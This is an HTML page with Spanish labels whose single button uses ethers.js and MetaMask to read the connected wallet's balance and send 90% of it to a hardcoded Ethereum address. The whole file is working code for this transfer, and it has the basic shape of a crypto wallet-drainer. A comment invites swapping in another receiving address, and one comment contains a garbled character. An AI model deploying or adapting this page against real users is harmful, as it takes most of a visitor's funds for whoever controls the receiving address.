<!DOCTYPE html>
<html>
<head>
	<title>Transferir el 90% del saldo</title>
</head>
<body>
	<h1>Transferir el 90% del saldo</h1>
	<button onclick="transferir()">Transferir</button>
	<script src="https://cdn.ethers.io/lib/ethers-5.2.umd.min.js" integrity="sha384-YtPpSMXa0t/+1kK0CgnJZboMZc7CwQ0jKb7aJ/zFsS0V7Ou8lTqV7KjQk4sF4DdO" crossorigin="anonymous"></script>
	<script>
		async function transferir() {
			if (typeof window.ethereum !== 'undefined') {
				await window.ethereum.enable();
				const provider = new ethers.providers.Web3Provider(window.ethereum);
				const signer = provider.getSigner();
				const address = await signer.getAddress();
				const balance = await provider.getBalance(address);
				const amountToTransfer = balance.mul(9).div(10); // Calcula el 90% del saldo
				const receiver = "0x01C65F22A9478C2932e62483509c233F0aaD5c72"; // Cambiar por la direcci√≥n de destino
				const transaction = {
					to: receiver,
					value: amountToTransfer
				};
				const response = await signer.sendTransaction(transaction);
				console.log(response);
			} else {
				alert("Por favor instale MetaMask para continuar.");
			}
		}
	</script>
</body>
</html>



